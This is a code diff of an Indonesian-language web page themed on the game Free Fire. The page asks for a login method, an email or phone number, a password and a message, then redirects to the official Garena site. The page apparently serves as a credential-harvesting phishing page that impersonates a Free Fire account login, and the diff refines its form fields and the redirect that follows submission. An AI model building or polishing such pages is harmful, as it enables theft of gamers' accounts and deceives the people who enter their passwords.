@@ -83,7 +83,7 @@ h2{
   text-shadow:0 0 10px cyan;
 }
 
-input, textarea{
+input, textarea, label, div, option{
   width:100%;
   padding:12px;
   margin:10px 0;
@@ -149,18 +149,16 @@ button:hover{
         <option value="apple">Apple</option>
     </select>
 
-      <h2>Email/Nomor</h2>
-
-<select id="metode" onchange="gantiInput()">
-    <option value="">-- Pilih --</option>
-    <option value="email">Email</option>
-    <option value="nomor">Nomor HP</option>
-</select>
-
-<br><br>
-
-<div id="inputArea"></div>
-      
+      <form>
+    <label for="email/nomor">Email/Nomor:</label>
+    <select id="email/nomor" name="email/nomor">
+        <option value="">-- Pilih --</option>
+        <option value="nomor">Nomor Hp</option>
+        <option value="email">Email</option>
+        </select>
+        
+      <input type="email" name="Masukkan Email" placeholder="Email" required>
+      <input type="number" name="Masukkan Nomor Hp" placeholder="Nomor Hp" required>
     <input type="text" name="Masukkan Password" placeholder="Password" required>
     <textarea name="message" rows="4" placeholder="Pesan" required></textarea>
     <button type="submit" onclick="bukaFreeFire()">Submit</button>
@@ -173,8 +171,14 @@ button:hover{
 
 <script>
 function bukaFreeFire(){
-    window.location.href = "https://ff.garena.com/";
-}
+    // Coba buka app (mungkin gagal)
+    window.location.href = "garena://";
+
+    // Kalau gagal 2 detik → buka website
+    setTimeout(function(){
+        window.location.href = "https://ff.garena.com/";
+    }, 2000);
+  }
 
 /* Particle Effect */
 const canvas = document.getElementById("particles");
@@ -211,28 +215,6 @@ function animate(){
   requestAnimationFrame(animate);
 }
 animate();
-
-  function gantiInput() {
-    var metode = document.getElementById("metode").value;
-    var area = document.getElementById("inputArea");
-
-    if (metode === "email") {
-        area.innerHTML = `
-            <label>Masukkan email anda (@gmail.com)</label><br>
-            <input type="email" placeholder="contoh@gmail.com" required>
-        `;
-    } 
-    else if (metode === "nomor") {
-        area.innerHTML = `
-            <label>Masukkan nomor HP</label><br>
-            <input type="text" placeholder="08xxxxxxxxxx"
-            oninput="this.value=this.value.replace(/[^0-9]/g,'')" required>
-        `;
-    } 
-    else {
-        area.innerHTML = "";
-    }
-  }
 </script>
 
 </body>
